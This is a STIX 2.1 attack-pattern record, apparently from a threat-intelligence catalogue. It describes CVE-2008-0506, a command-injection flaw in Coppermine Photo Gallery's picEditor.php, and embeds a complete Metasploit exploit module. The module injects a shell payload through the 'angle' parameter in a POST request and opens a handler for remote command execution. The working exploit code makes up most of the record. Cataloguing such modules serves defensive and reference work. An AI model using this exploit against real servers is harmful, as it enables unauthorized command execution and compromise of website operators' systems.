{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e1647ce6-30e6-49f6-9051-f18cf92951fa",
    "created": "2024-08-14T17:12:21.221214Z",
    "modified": "2024-08-14T17:12:21.221217Z",
    "name": "Coppermine Photo Gallery picEditor.php Command Execution",
    "description": " This module exploits a vulnerability in the picEditor.php script of Coppermine Photo Gallery versions 1.4.14 and earlier. When configured to use the ImageMagick library, the 'quality', 'angle', and 'clipval' parameters are not properly escaped before being passed to the PHP 'exec' command.  In order to reach the vulnerable 'exec' call, the input must pass several validation steps.  The vulnerabilities actually reside in the following functions:  image_processor.php: rotate_image(...) include/imageObjectIM.class.php: imageObject::cropImage(...) include/imageObjectIM.class.php: imageObject::rotateImage(...) include/imageObjectIM.class.php: imageObject::resizeImage(...) include/picmgmt.inc.php: resize_image(...)  NOTE: Use of the ImageMagick library is a non-default option. However, a user can specify its use at installation time. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/coppermine_piceditor.rb",
            "external_id": "coppermine_piceditor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-0506"
        },
        {
            "source_name": "reference",
            "url": "http://forum.coppermine-gallery.net/index.php?topic=50103.0"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Coppermine Photo Gallery picEditor.php Command Execution',\n      'Description'    => %q{\n        This module exploits a vulnerability in the picEditor.php script of\n        Coppermine Photo Gallery versions 1.4.14 and earlier. When configured to\n        use the ImageMagick library, the 'quality', 'angle', and 'clipval'\n        parameters are not properly escaped before being passed to the PHP\n        'exec' command.\n\n        In order to reach the vulnerable 'exec' call, the input must pass\n        several validation steps.\n\n        The vulnerabilities actually reside in the following functions:\n\n        image_processor.php: rotate_image(...)\n        include/imageObjectIM.class.php: imageObject::cropImage(...)\n        include/imageObjectIM.class.php: imageObject::rotateImage(...)\n        include/imageObjectIM.class.php: imageObject::resizeImage(...)\n        include/picmgmt.inc.php: resize_image(...)\n\n        NOTE: Use of the ImageMagick library is a non-default option. However, a\n        user can specify its use at installation time.\n      },\n      'Author'         =>\n        [\n          'Janek Vind', # original discovery/exploit\n          'jduck'       # metasploit version\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-0506' ],\n          [ 'OSVDB', '41676' ],\n          [ 'EDB', '5019' ],\n          [ 'URL', 'http://forum.coppermine-gallery.net/index.php?topic=50103.0' ]\n        ],\n      'Privileged'     => true, # web server context\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'BadChars'    => '\\'', # input gets passed to htmlentities\n          'Space'       => 1024,\n        },\n      'Platform'       => [ 'unix' ],\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2008-01-30',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('URI', [ true, \"Coppermine directory path\", \"/cpg1414\" ]),\n        ])\n  end\n\n  def check\n    res = send_request_raw({\n      'uri' => normalize_uri(datastore['URI'], '/picEditor.php')\n    }, 25)\n\n    if (res and res.body =~ /Coppermine Picture Editor/i)\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n\n    valid_imgs = %w{thumb_audio.jpg thumb_avi.jpg thumb_doc.jpg thumb_document.jpg thumb_gz.jpg\n      thumb_htm.jpg thumb_html.jpg thumb_mid.jpg thumb_midi.jpg thumb_mov.jpg thumb_movie.jpg\n      thumb_mp3.jpg thumb_mpeg.jpg thumb_mpg.jpg thumb_nopic.jpg thumb_ogg.jpg thumb_pdf.jpg\n      thumb_private.jpg thumb_qtv.jpg thumb_ra.jpg thumb_ram.jpg thumb_rar.jpg thumb_rm.jpg\n      thumb_rmj.jpg thumb_swf.jpg thumb_txt.jpg thumb_wav.jpg thumb_wma.jpg thumb_wmv.jpg\n      thumb_xls.jpg thumb_zip.jpg}\n    img = '../../images/' + valid_imgs[rand(valid_imgs.length)]\n    # suppress errors from convert\n    angle = rand_text_numeric(1+rand(8)) + ' -quiet 1 2'\n    # and exec our cmd :)\n    angle += ';' + payload.encoded + ';#'\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'\t      => normalize_uri(datastore['URI'], \"/picEditor.php\"),\n      'vars_post' =>\n        {\n          'angle' => angle,\n          'quality' => '50',  # not required, but fixes an error message\n          'newimage' => img\n        }\n      }, 25)\n\n    if (res and res.code == 200)\n      print_good(\"Successfully POST'd exploit data\")\n    else\n      fail_with(Failure::Unknown, \"Error POSTing exploit data\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-01-30",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}